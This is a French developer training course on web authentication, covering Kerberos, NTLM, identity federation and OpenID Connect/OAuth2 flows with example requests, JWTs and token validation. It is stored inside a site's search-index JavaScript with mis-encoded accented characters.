prÃ©remplir le questionnaire avec ce que je sais dÃ©jÃ \nComment savoir si l\u0026rsquo;utilisateur a les droits ? # Le mode d\u0026rsquo;authentification peut fournir une rÃ©ponse plus complÃ¨te contenant des rÃ´les. Je peux alors me servir de ces rÃ´les rÃ©cupÃ©rÃ©s pour gÃ©rer l\u0026rsquo;accÃ¨s Ã  mes ressources.\nM Robichu se connecte Ã  mon questionnaire en ligne.\n*Il a pu s\u0026rsquo;authentifier correctement sur l\u0026rsquo;application, les informations connues de l\u0026rsquo;application sont maintenant son identifiant mais aussi une liste de rÃ´les dont \u0026ldquo;repondant-enquete-satisfaction-joint-etancheite-climatiseur-morgue\u0026rdquo;. *\nJe sais directement que M Robichu a les droits sur l\u0026rsquo;application. Mais rien ne m\u0026rsquo;empÃªche de chercher en base de donnÃ©es des informations plus prÃ©cises sur M Robichu\nComment savoir si l\u0026rsquo;utilisateur a les droits ? # RÃ´les dans l\u0026rsquo;authentification ou en base de donnÃ©es ?\nSe limiter au rÃ´les le plus brut possible dans le systÃ¨me d\u0026rsquo;authentification (rÃ©pondant, administrateur)\nÃ‰viter de trop spÃ©cifier le rÃ´le surtout si l\u0026rsquo;on possÃ¨de l\u0026rsquo;information en base de donnÃ©es. (rÃ©pondant Ã  l\u0026rsquo;enquÃªte X, Ã  l\u0026rsquo;enquÃªte Y, etc.)\nQuelques exemples d\u0026rsquo;authentification # Authentifications directes :\n Basic Formulaire Certificat Client Kerberos : adaptÃ© au Web par SPNEGO, Simple and Protected GSSAPI (Generic Security Services Application Program Interface) Negotiation Mechanism, implÃ©mentÃ© par AD NTLM (NT Lan Manager) : SystÃ¨mes Windows ou compatible AD  Authentifications centralisÃ©es nÃ©cessitant l\u0026rsquo;utilisation d\u0026rsquo;un autre mode :\n SAML OpenID Connect  Kerberos # WWW-Authenticate: Negociate\n SystÃ¨me d\u0026rsquo;Ã©change de jeton basÃ© sur des clÃ©s symÃ©triques (dÃ©duites des mots de passes)  https://blog.devensys.com/kerberos-principe-de-fonctionnement/\nNTLM # Kerberos simplifiÃ© et moins sÃ©curisÃ©\nWWW-Authenticate: NegociateNTLM\n Envoi de l\u0026rsquo;identifiant Challenge du serveur, Ã  rÃ©soudre avec le hash du mot de passe Le serveur demande Ã  AD de valider (identifiant,challenge, rÃ©ponse du client) AD rÃ©pond au serveur si l\u0026rsquo;authentification est OK  Authentifications Kerberos ou NTLM : SÃ©curitÃ© #  Afin de contrÃ´ler ce flux, les sources autorisÃ©es Ã  Ã©mettre une demande de challenge sont contrÃ´lÃ©es Dans Firefox, il s\u0026rsquo;agit des propriÃ©tÃ©s suivantes (about:config)  network.negotiate-auth.delegation-uris : insee.intra,insee.fr,insee.test,insee.eu,localhost network.negotiate-auth.trusted-uris : insee.intra,insee.fr,insee.test,insee.eu,localhost network.automatic-ntlm-auth.trusted-uris :  Plus d\u0026rsquo;informations : https://developer.mozilla.org/en-US/docs/Mozilla/Integrated_authentication\nConfidentialitÃ© de l\u0026rsquo;authentification #  Kerberos, NTLM, SAML : SÃ©curitÃ© intrinsÃ¨que (mÃªme sur un canal en clair, une lecture rÃ©seau ne permet pas d\u0026rsquo;obtenir des informations sur les credentials de l\u0026rsquo;utilisateur) Certificat client : Ã‰tape du protocole HTTPS Formulaire, Basic, OIDC : SÃ©curitÃ© basÃ©e sur un canal chiffrÃ© (HTTPS)  Utilisation d\u0026rsquo;une fÃ©dÃ©ration d\u0026rsquo;identitÃ© #  On verra le fonctionnement en dÃ©tail plus tard (SAML, OpenIDConnect) Principe : dÃ©lÃ©guer l\u0026rsquo;authentification Ã  un autre systÃ¨me (Kerberos et NTLM sont au fond des fÃ©dÃ©rations d\u0026rsquo;identitÃ©) IntÃ©rÃªts :  Authentification centralisÃ©e Ã‰viter les accÃ¨s directs aux annuaires SSO AmÃ©lioration de la sÃ©curitÃ© : la sÃ©curitÃ© est Ã©galement dÃ©lÃ©guÃ©e au protocole et au systÃ¨me authentifiant, reduction de la surface d\u0026rsquo;attaque Cependant la sÃ©curitÃ© du client reste Ã  la charge des applications    "}).add({id:11,href:"/docs/authentification/oidc/oidc/",title:"Fonctionnement d'OpenID Connect",description:"Protocole grandement basÃ© sur le protocole OAuth 2.0.\nOAuth2 ne gÃ¨re que l\u0026rsquo;autorisation : il permet d\u0026rsquo;autoriser l\u0026rsquo;accÃ¨s Ã  une ressource en dÃ©lÃ©guant la source de contÃ´le Ã  une autre entitÃ©\nLes systÃ¨me d\u0026rsquo;autorisations sont basÃ©s sur un token : on doit spÃ©cifier Ã  l\u0026rsquo;application consommatrice le moyen de le vÃ©rifier\nUn peu de vocabulaire\n Un resource owner se connecte Ã  une application cliente d\u0026rsquo;un resource server. Le resource server accepte de donner les resources appartenant au resource owner s\u0026rsquo;il lui fournit un jeton obtenu via un authorization server.",content:"Protocole grandement basÃ© sur le protocole OAuth 2.0.\nOAuth2 ne gÃ¨re que l\u0026rsquo;autorisation : il permet d\u0026rsquo;autoriser l\u0026rsquo;accÃ¨s Ã  une ressource en dÃ©lÃ©guant la source de contÃ´le Ã  une autre entitÃ©\nLes systÃ¨me d\u0026rsquo;autorisations sont basÃ©s sur un token : on doit spÃ©cifier Ã  l\u0026rsquo;application consommatrice le moyen de le vÃ©rifier\nUn peu de vocabulaire\n Un resource owner se connecte Ã  une application cliente d\u0026rsquo;un resource server. Le resource server accepte de donner les resources appartenant au resource owner s\u0026rsquo;il lui fournit un jeton obtenu via un authorization server.  On distinguera le client qui correspond Ã  un application ayant besoin d\u0026rsquo;une identitÃ© pour fonctionner de l\u0026rsquo;utilisateur qui est la personne physique qui possÃ¨de une identitÃ©\nLes grands principes # SÃ©quencement # Avertissement : schema simplifiÃ© par rapport Ã  la spec complÃ¨te\nNotre utilisateur Alphone Robichu doit se connecter Ã  l\u0026rsquo;application de gestion. Il doit se connecter en tant qu\u0026rsquo;administrateur sur l\u0026rsquo;application de gestion. L\u0026rsquo;application de gestion fait appel Ã  un web service du service de gestion des stocks. Cet appel doit se faire avec sa vÃ©ritable identitÃ© \u0026ldquo;Alphonse Robichu\u0026rdquo; et non avec un compte gÃ©nÃ©rique.\nsequenceDiagram actor U as Alphonse participant A as AppGestion participant S as AppStock box LightGrey Authorization Server participant E as Authentication Endpoint participant F as Token Endpoint end U-\u0026gt;\u0026gt;A: Hello ! A-\u0026gt;\u0026gt;U: 302 Authentifie toi ! U-\u0026gt;\u0026gt;E: AppGestion me demande me m\u0026#39;authentifier chez toi U-\u0026gt;\u0026gt;E: Login (id/mdp par exemple) U--\u0026gt;\u0026gt;E: Consentement E-\u0026gt;\u0026gt;U: 302 Donne ce code Ã  AppGestion U-\u0026gt;\u0026gt;A: Voici le code fourni par l\u0026#39;IDP A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un jeton contre ce code ? F-\u0026gt;\u0026gt;A: {accessToken, refreshToken} A-\u0026gt;\u0026gt;A: check {accessToken} loop A-\u0026gt;\u0026gt;S: get /resource/stocks muni de {accessToken} S-\u0026gt;\u0026gt;S: check {accessToken} S-\u0026gt;\u0026gt;A: /ressource/stocks end Note over A,S: {accessToken} expirÃ© A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un nouveau jeton contre ce {refreshToken} ?  Le consentement #  Avec un fournisseur d\u0026rsquo;identitÃ© partagÃ©, potentiellement sur plusieurs domaines diffÃ©rents, se pose la question du consentement Le fournisseur d\u0026rsquo;identitÃ© va transmettre un certain nombre d\u0026rsquo;information Ã  l\u0026rsquo;application cliente via le jeton Le ressource owner peut contrÃ´ler les informations transmises  Exemple\n Un service lambda vous propose de vous athentifiez avec Facebook, Facebook vous avertit des informations qui vont Ãªtre transmises au site tiers  Les jetons #  Access token : marqueur de l\u0026rsquo;identitÃ©. On doit Ãªtre capable via son contenu signÃ© et/ou via requete au serveur d\u0026rsquo;autorisation d\u0026rsquo;associer de faÃ§on fiable une identitÃ© Ã  un access token Refresh token : NE doit servir QU\u0026rsquo;une seule fois pour obtenir un nouveau couple {access token, refresh token} Il existe aussi l\u0026rsquo;ID Token initialement dÃ©diÃ© pour porter les information d\u0026rsquo;identitÃ©. La spec OAuth ne prÃ©cisant rien sur le format des access token. Dans la pratique on peut rendre Ã©gaux les Access et ID Token  ConfidentialitÃ© des jeton Les information stockÃ©es dans le jeton NE sont pas CHIFFRÃ‰ES. Dans un mode qui utilise massivement https, la sÃ©curitÃ© de OAuth2 se base grandement sur HTTPS. On considÃ¨re que le jetons non chiffrÃ© tansite toujours sur un canal chiffrÃ©s.\nIntÃ©gritÃ© du jeton MÃªme sur un canal chiffrÃ©, n\u0026rsquo;importe qui pourrait forger un access token ressemblant Ã  un access token au nom de Alphonse Robichu mais non issu du serveur d\u0026rsquo;autorisation.\nL\u0026rsquo;unique mÃ©thode de controle prÃ©sentÃ© ici sera la signature.\nLes diffÃ©rents flows # Authorization code # C\u0026rsquo;est le mode de fonctionnement Standard prÃ©sentÃ© dans la partie prÃ©cÃ©dente\n1/ login =\u0026gt; code 2/ code =\u0026gt; token\nUsage ? SystÃ©matique Ã  moins de rentrer dans les cas suivants !\nEn particulier dans le cadre d\u0026rsquo;application de type \u0026ldquo;exÃ©cution serveur\u0026rdquo; au sein d\u0026rsquo;un mÃªme SI, il permet de limiter grandement la circulation des access token sur le rÃ©seau.\nImplicite : DÃ‰PRÃ‰CIÃ‰ !!! # Ressemble fortement au prÃ©cÃ©dent mais en simplifiÃ©\n1/ login =\u0026gt; token\nClairement, le serveur fournit directement un token dans la redirection et non un code Ã  Ã©changer. Ce flow Ã©tait historiquement utilisÃ© dans le cadre des applications de type javascript Ã©xÃ©cutÃ©s dans le navigateur acr le code semblait alourdir le flow sans apporter de gains de sÃ©curitÃ©.\nLa position a Ã©tÃ© depuis revu pour vaforiser le flow Authorization code dans ce contexte Ã©galement\nResource Owner Password Credentials ou Direct Grant # sequenceDiagram actor U as Alphonse participant A as AppGestion participant S as AppStock box LightGrey Authorization Server participant F as Token Endpoint end U-\u0026gt;\u0026gt;A: Hello ! A-\u0026gt;\u0026gt;U: Ton login et mot de passe ? U-\u0026gt;\u0026gt;A: Login id/mdp A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un jeton contre ces id/mdp ? F-\u0026gt;\u0026gt;A: {accessToken, refreshToken} A-\u0026gt;\u0026gt;A: check {accessToken} loop A-\u0026gt;\u0026gt;S: get /resource/stocks muni de {accessToken} S-\u0026gt;\u0026gt;S: check {accessToken} S-\u0026gt;\u0026gt;A: /ressource/stocks end Note over A,S: {accessToken} expirÃ© A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un nouveau jeton contre ce {refreshToken} ?  Usage ?\nCe flow est Ã  rÃ©server aux applications qui ne peuvent pas gÃ©rer des redirections, typiquement des applications \u0026ldquo;lourdes\u0026rdquo; installÃ©es sur un poste. A noter que la grande diffÃ©rence avec le flow Standard est que l\u0026rsquo;application cliente connait le mot de passe de l\u0026rsquo;utilisateur, ce que l\u0026rsquo;on cherche plutÃ´t Ã  Ã©viter avec l\u0026rsquo;utilisation d\u0026rsquo;un fournisseur d\u0026rsquo;identitÃ©.\nClient Credentials Grant # sequenceDiagram participant A as AppGestion participant S as AppStock box LightGrey Authorization Server participant F as Token Endpoint end A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un jeton en tant que appGestion ? F-\u0026gt;\u0026gt;A: {accessToken, refreshToken} A-\u0026gt;\u0026gt;A: check {accessToken} loop A-\u0026gt;\u0026gt;S: get /resource/stocks muni de {accessToken} S-\u0026gt;\u0026gt;S: check {accessToken} S-\u0026gt;\u0026gt;A: /ressource/stocks end A-\u0026gt;\u0026gt;F: Je suis appGestion, puis avoir un nouveau jeton contre ce {refreshToken} ?  Le jeton d\u0026rsquo;accÃ¨s propre au client et non Ã  un utilisateur\nUsage ?\nSoit dans les cas oÃ¹ l\u0026rsquo;on a pas d\u0026rsquo;utilisateur du tout comme un batch. Soit dans les cas oÃ¹ on considÃ¨re que l\u0026rsquo;accÃ¨s au web service \u0026ldquo;backend\u0026rdquo; n\u0026rsquo;a pas de sens Ã  Ãªtre identifiÃ© en tant qu\u0026rsquo;utilisateur.\nLe jeton JWT # Les jetons Ã©changÃ©s seront sous un format dit JWT, JSON Web Token.\nLes donnÃ©es au format JSON, en trois parties : header, payload et signature\nHeader # { \u0026quot;alg\u0026quot;: \u0026quot;RS256\u0026quot;, \u0026quot;typ\u0026quot;: \u0026quot;JWT\u0026quot;, \u0026quot;kid\u0026quot;: \u0026quot;eYjLrajOiGhn_R3Yfmok2c3v3PrUZZ9ibXob0MowXvw\u0026quot; }  PrÃ©sente notamment l\u0026rsquo;algorithme de signature utilisÃ©, dans l\u0026rsquo;exemple ici, le jeton est signÃ© avec une signature asymÃ©trique. Le serveur d\u0026rsquo;authentification possÃ¨de une clÃ© privÃ©e secrÃ¨te avec laquelle il a signÃ©e le jeton.\nIl diffuse ouvertement sa clÃ© publique qui permet de controller la signature.\nPayload # { \u0026quot;exp\u0026quot;: 1528739605, \u0026quot;iat\u0026quot;: 1528739305, \u0026quot;iss\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation\u0026quot;, \u0026quot;aud\u0026quot;: \u0026quot;client-test-web\u0026quot;, \u0026quot;typ\u0026quot;: \u0026quot;Bearer\u0026quot;, \u0026quot;azp\u0026quot;: \u0026quot;client-test-web\u0026quot;, \u0026quot;auth_time\u0026quot;: 1528739299, \u0026quot;session_state\u0026quot;: \u0026quot;ac727f77-fcc4-403c-9765-6ee58bc980f5\u0026quot;, \u0026quot;acr\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;roles\u0026quot;: [\u0026quot;Responsable_Clients\u0026quot;,\u0026quot;Gestionnaire_Stocks\u0026quot;], \u0026quot;name\u0026quot;: \u0026quot;Alphonse Robichu\u0026quot;, \u0026quot;preferred_username\u0026quot;: \u0026quot;id\u0026quot;, \u0026quot;given_name\u0026quot;: \u0026quot;Alphonse\u0026quot;, \u0026quot;family_name\u0026quot;: \u0026quot;Robichu\u0026quot;, \u0026quot;email\u0026quot;: \u0026quot;alphonse.robichu@my.org\u0026quot; }  Les infos \u0026ldquo;utiles\u0026rdquo; transitÃ©s par le jeton dont certaines dÃ©diÃ©es aux contrÃ´le ou Ã  des prÃ©cisions sur le mode d\u0026rsquo;authentification telles que - iat : le serveur qui a Ã©mis le jeton - exp : la date d\u0026rsquo;expiration du jeton - acr : le niveau de fiabilitÃ© de l\u0026rsquo;authentification (nombre de facteurs par exemple)\nOn appelle claim chaque Ã©lÃ©ment de ce jeton.\nLes fournisseur d\u0026rsquo;identitÃ© fournissent gÃ©nÃ©ralement un ensemble de claim par dÃ©faut mais le client est censÃ© prÃ©ciser les claims requi via un paramÃ¨tre de scope Ã  convenir entre client et serveur d\u0026rsquo;autorisation.\n\u0026ldquo;Je suis appGestion\u0026rdquo; : comment vÃ©rifier ? # Par identifiant/mot de passe ? # On va parler de client_id et de client_secret\nEfficace dans le cas ou AppGestion est une application purement serveur (pas une appli javascript tournant dans un navigateur) ou dans les cas Direct Grant et Client Credential.\nDans le cas de Client Credential, c\u0026rsquo;est d\u0026rsquo;ailleurs l\u0026rsquo;unique protection de rÃ©cupÃ©ration du jeton.\nCette vÃ©rification est totalement inÃ©fficace dans le cas d\u0026rsquo;une application de type javascript tournant sur navigateur, en effet dela reviendrait Ã  Ã©crire le mot de passe dans le code source recu par l\u0026rsquo;utilisateur\u0026hellip;\nDans ce dernier cas, les requÃªtes sur /token seront donc non authentifiÃ©es.\nSi une application cliente possÃ¨de un mot de passe on parlera de client confidential, sinon c\u0026rsquo;est un client public\nPar url de redirection ? # Quand le cas du flow Standard, la redirection va forcÃ©ment faire mention Ã  l\u0026rsquo;url de retour vers l\u0026rsquo;application. On peut donc contrÃ´ler le format de cette url et empecher de renvoyer vers une url qui n\u0026rsquo;est pas censÃ©e Ãªtre utilisÃ©e en fonctionnement normal.\nCette protection n\u0026rsquo;a aucune signification dans le cas de Direct Grant ou de Client Credential.\nPar url d\u0026rsquo;origine ? # Dans le cas des application de type javascript Ã©xÃ©cutÃ©es dans navigateur, les requetes /token seront Ã©xÃ©cutÃ©es depuis les script et un navigateur effectuera ainsi la protection CORS.\nCas du web service \u0026ldquo;backend\u0026rdquo; # Si un service n\u0026rsquo;est pas une ihm, il n\u0026rsquo;est pas censÃ© demander une identitÃ© mais uniquement les contrÃ´ler.\nOn differencie explicitement les application comme AppGestion dans l\u0026rsquo;exemple :\n ont une ihm les utilisateurs s\u0026rsquo;y connecte en n\u0026rsquo;tÃ©ant pas encore authentifiÃ© l\u0026rsquo;application doit Ãªtre en mesure de rediriger vers l\u0026rsquo;idp, donc de \u0026ldquo;crÃ©er\u0026rdquo; un identitÃ© l\u0026rsquo;application gÃ¨re des sessions de faÃ§on Ã  ne pas rÃ©authentifier l\u0026rsquo;utilisateur Ã  chaque requÃªte  de l\u0026rsquo;application web service de gestion des stocks qui :\n n\u0026rsquo;a pas d\u0026rsquo;ihm n\u0026rsquo;est censÃ© recevoir que des requÃªtes identifiÃ©es \u0026ldquo;explicitement\u0026rdquo; n\u0026rsquo;est pas censÃ© rÃ©agir Ã  une requete anonyme autrement que par 401 l\u0026rsquo;identitÃ© est revÃ©rifiÃ©e Ã  chaque requÃªte (pas de gestion de session)  On parlera pour ce dernier type d\u0026rsquo;application, d\u0026rsquo;application bearer-only, c\u0026rsquo;est Ã  dire dont le seul mode d\u0026rsquo;authentification doit Ãªtre la prÃ©sence d\u0026rsquo;un jeton dans la requÃªte.\nCes applications n\u0026rsquo;ont en gÃ©nÃ©ral pas Ã  Ãªtre connu du fournisseur d\u0026rsquo;identitÃ©\nEt le swagger ? # Le swagger n\u0026rsquo;est PAS l\u0026rsquo;api, c\u0026rsquo;est techniquement une seconde application exposÃ©e sur le mÃªme serveur que l\u0026rsquo;api qui doit Ãªtre traitÃ©e comme une application Ã  part entiÃ¨re.\nEn l\u0026rsquo;occurence il s\u0026rsquo;agit d\u0026rsquo;une application de type javascript Ã©xÃ©cutÃ©e sur navigateur.\nLes requÃªtes Ã  la loupe # Flow Authorization Code # Connexion Ã  Appgestion, redirection vers l\u0026rsquo;authorization server.\nGET https://mon.fournisseur.identite/auth ?redirect_uri=https://mon.appli.gestion/sso/callback \u0026amp;state=9115c618-b01c-4966-a26e-8171caf30dcf \u0026amp;.......   Le paramÃ¨tre redirect_uri permet le contrÃ´le de l\u0026rsquo;url de l\u0026rsquo;application de gestion oÃ¹ sera envoyÃ© le code Le paramÃ¨tre state est gÃ©nÃ©rÃ© alÃ©atoirement par le client, il permet d\u0026rsquo;Ã©viter les attaque de type CSRF, il devra Ãªtre renvoyÃ© et contrÃ´lÃ© par le client au retour : l\u0026rsquo;application le stocke associÃ© Ã  la session de l\u0026rsquo;utilisateur  Suite Ã  l\u0026rsquo;authentification sur l\u0026rsquo;authorization server, redirection vers l\u0026rsquo;application\nGET https://mon.appli.gestion/sso/callback ?state=9115c618-b01c-4966-a26e-8171caf30dcf \u0026amp;session_state=cc84a1d5-2f0e-4100-aef9-be6aa4278d91 \u0026amp;code=eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0.[...] \u0026amp;.......   Le state permet donc de s\u0026rsquo;assurer que l\u0026rsquo;application est bien initiatrice du processus d\u0026rsquo;authentification Le session_state est gÃ©nÃ©rÃ© alÃ©atoirement par le fournisseur d\u0026rsquo;identitÃ©, dans la mÃªme logique que le state, il permettra de corrÃ©ler la demande d\u0026rsquo;authentification au reste du processus (notamment pour Ã©viter les rejeu) Le code Ã  Ã©changer contre un token. A noter que durant sa durÃ©e de validitÃ©, le code est autant critique que le mot de passe de l\u0026rsquo;utilisateur  L\u0026rsquo;application demande un jeton\nPOST https://mon.fournisseur.identite/token/token Authorization: Basic YXBwbGktdGVzdDphOWUzMmYzMC1hNzFiLTQ0Y2ItODQwMi1iZjdkY2VmNzlhMTM= # appli-test:[Secret] Content-Type: application/x-www-form-urlencoded; charset=UTF-8 [...] grant_type=authorization_code \u0026amp;code=eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0.[...]   grant_type : le type de troc demandÃ© au serveur, ici on va Ã©changer un code contre un token la code l\u0026rsquo;authentification du client le cas Ã©chÃ©ant en authentification Basic  Dans le cas de client public (javascript), il n\u0026rsquo;y a donc pas d\u0026rsquo;entete Authorization\nSi tout se pass bien, le serveur d\u0026rsquo;autorisation va donc rÃ©pondre :\n{ \u0026quot;access_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;expires_in\u0026quot;:300, \u0026quot;refresh_expires_in\u0026quot;:1800, \u0026quot;refresh_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;token_type\u0026quot;:\u0026quot;bearer\u0026quot;, \u0026quot;id_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;not-before-policy\u0026quot;:0, \u0026quot;session_state\u0026quot;:\u0026quot;34dc14d5-bbd0-4c15-86b4-2d40629e0ced\u0026quot;, \u0026quot;scope\u0026quot;:\u0026quot;\u0026quot; }  On retrouve notamment le session_state permettant de controller la corrÃ©lation des demandes.\nOn obtient donc les diffÃ©rents token attendus :\n L\u0026rsquo;access token qui peut Ã©galer l\u0026rsquo;ID token dans son contenu \u0026ldquo;utile\u0026rdquo; mais qui est censÃ© Ãªtre le seul Ã  pouvoir donner authentification via Ã©change de jeton. A noter que durant sa durÃ©e de validitÃ©, l\u0026rsquo;access token est autant critique que le mot de passe de l\u0026rsquo;utilisateur. Comme il peut Ãªtre ammenÃ© Ã  beaucoup circuler sur le rÃ©seau, sa durÃ©e de validitÃ© est censÃ© Ãªtre trÃ¨s rÃ©duite (recommandÃ© vers 5 minutes). le refresh token est censÃ© Ãªtre Ã  usage unique, pour renouveler la demande prÃ©cÃ©dente mais en Ã©pargnant l\u0026rsquo;utilisateur d\u0026rsquo;aller rechercher un code.  POST https://mon.fournisseur.identite/token/token Authorization: Basic YXBwbGktdGVzdDphOWUzMmYzMC1hNzFiLTQ0Y2ItODQwMi1iZjdkY2VmNzlhMTM= Content-Type: application/x-www-form-urlencoded; charset=UTF-8 [...] grant_type=refresh_token\u0026amp;refresh_token=eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]  (Et toujours dans le cas de client public : pas d\u0026rsquo;entete Authorization)\n{ \u0026quot;access_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;expires_in\u0026quot;:300, \u0026quot;refresh_expires_in\u0026quot;:1800, \u0026quot;refresh_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;token_type\u0026quot;:\u0026quot;bearer\u0026quot;, \u0026quot;id_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, \u0026quot;not-before-policy\u0026quot;:0, \u0026quot;session_state\u0026quot;:\u0026quot;2bf0c940-ac60-488c-bc32-d6ced922f90d\u0026quot;, \u0026quot;scope\u0026quot;:\u0026quot;\u0026quot; }  A noter que l\u0026rsquo;on obtient un nouveau refresh token qui est censÃ© invalider le prÃ©cÃ©dent\nUn refresh token ne circule donc en Ã©tant valide que deux fois sur le rÃ©seau, d\u0026rsquo;oÃ¹ la fait que sa durÃ©e peut Ãªtre longue (chiffrÃ©e en heures).\nContrÃ´le du jeton # Le serveur doit connaitre la clÃ© publique du serveur d\u0026rsquo;autorisation pour valider les access-token (c\u0026rsquo;est d\u0026rsquo;ailleurs l\u0026rsquo;unique vÃ©rification faite dans le cas d\u0026rsquo;un bearer-only)\nLa clÃ© publique de validation de la signature peut Ãªtre stockÃ©e en dÃ»r dans l\u0026rsquo;application cliente.\nOn peut aussi la demander au serveur d\u0026rsquo;autorisation.\nGET https://mon.foutrnisseur.identite/.well-known/openid-configuration  { \u0026quot;issuer\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation\u0026quot;, \u0026quot;authorization_endpoint\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation/protocol/openid-connect/auth\u0026quot;, \u0026quot;token_endpoint\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation/protocol/openid-connect/token\u0026quot;, \u0026quot;end_session_endpoint\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation/protocol/openid-connect/logout\u0026quot;, \u0026quot;jwks_uri\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth/realms/formation/protocol/openid-connect/certs\u0026quot;, ... }  Connexion Ã  un service bearer-only # GET https://ma.gestion.de.stocks/stocks/ressource Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]  L\u0026rsquo;acces token est envoyÃ© brut dans l\u0026rsquo;entÃªte Authorization\nFlow Client Credentials #  RÃ©cupÃ©ration d\u0026rsquo;un jeton :  POST auth/realms/formation/protocol/openid-connect/token Content-Type: application/x-www-form-urlencoded grant_type=client_credentials\u0026amp;client_id=YOUR_CLIENT_ID\u0026amp;client_secret=YOUR_CLIENT_SECRET  { \u0026quot;access_token\u0026quot;:\u0026quot;eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJiMWs3ZXNUbG1XTHBVSXIydEp2c0E4V0tDS1EtNWNvUjVNVmQwVFRHRlFBIn0.[...]\u0026quot;, ... }  Configuration OpenIDConnect # L\u0026rsquo;appli cliente doit connaitre quelques endpoints du serveur d\u0026rsquo;autorisation\n endpoint auth endpoint token enpoint jwks (clÃ©s publiques)  ces endpoints sont de faÃ§on standard donnÃ©s sur l\u0026rsquo;url https://mon.foutrnisseur.identite/.well-known/openid-configuration\nUne configuration doit Ãªtre nÃ©gociÃ©e entre l\u0026rsquo;application client et le serveur d\u0026rsquo;autorisation\n Le client_id Le client_secret le cas Ã©chÃ©ant (donc pas pour les applis javascript)  Une application de bearer-only n\u0026rsquo;a besoin que de la clÃ© publique de validation ou de l\u0026rsquo;url pour l\u0026rsquo;obtenir.\nCette url est accessible sans authentification, il n\u0026rsquo;est pas nÃ©cessaire de configurer le fournisseur d\u0026rsquo;dentitÃ© autour de l\u0026rsquo;identitÃ© du client bearer-only\nLe concept d\u0026rsquo;expiration rapide de l\u0026rsquo;access token et de renouvellement entraine gÃ©nralement plusieurs configuration requisse sur la politique de renouvellement des jeton\n A chaque requÃªte ? AprÃ¨s expiration ? Toutes les n secondes fixes ? n secondes avant expiration ?  Des configurations plus applicatives sont souvent demandÃ©es telles que le claim fournissant le nom d\u0026rsquo;utilisateur ou la liste de ses habilitations\n"}).add({id:12,href:"/docs/authentification/java/",title:"",description:"",content:""}).add({id:13,href:"/docs/authentification/js/",title:"",description:"",content:""}).add({id:14,href:"/docs/authentification/oidc/keycloak/",title:"",description:"",content:""}).add({id:15,href:"/docs/authentification/oidc/oidc-java/",title:"",description:"",content:""}).add({id:16,href:"/docs/authentification/oidc/oidc-js/",title:"",description:"",content:""}).add({id:17,href:"/docs/authentification/saml/",title:"",description:"",content:""}).add({id:18,href:"/docs/authentification/tomcat/",title:"",description:"",content:""}).add({id:19,href:"/docs/",title:"Docs",description:"",content:""}),search.addEventListener("input",t,!0);function t(){const s=5;var n=this.value,o=e.search(n,{limit:s,enrich:!0});const t=new Map;for(const e of o.flatMap(e=>e.result)){if(t.has(e.doc.href))continue;t.set(e.doc.href,e.doc)}if(suggestions.innerHTML="",suggestions.classList.remove("d-none"),t.size===0&&n){const e=document.createElement("div");e.innerHTML=`No results for "<strong>${n}</strong>"`,e.classList.add("suggestion__no-results"),suggestions.appendChild(e);return}for(const[r,a]of t){const n=document.createElement("div");suggestions.appendChild(n);const e=document.createElement("a");e.href=r,n.appendChild(e);const o=document.createElement("span");o.textContent=a.title,o.classList.add("suggestion__title"),e.appendChild(o);const i=document.createElement("span");if(i.textContent=a.description,i.classList.add("suggestion__description"),e.appendChild(i),suggestions.appendChild(n),suggestions.childElementCount==s)break}}})()